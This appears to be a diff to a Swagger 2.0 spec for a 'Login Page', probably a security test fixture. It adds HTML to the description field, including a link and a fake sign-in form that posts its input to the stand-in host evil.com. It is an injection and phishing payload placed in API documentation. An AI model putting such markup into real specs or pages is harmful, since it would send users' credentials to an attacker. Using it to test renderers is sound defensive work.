@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Login Page
-  description: <a href="https://www.evil.com">Click Me</a>">
+  description: <a href="https://www.evil.com">Click Me</a>"> |
 <div class="form-container">
       <form action="https://evil.com" method="get" class="form-signin">
         <div class="form-group">
@@ -30,3 +30,4 @@ paths:
       responses:
         '200':
           description: Login successful
+
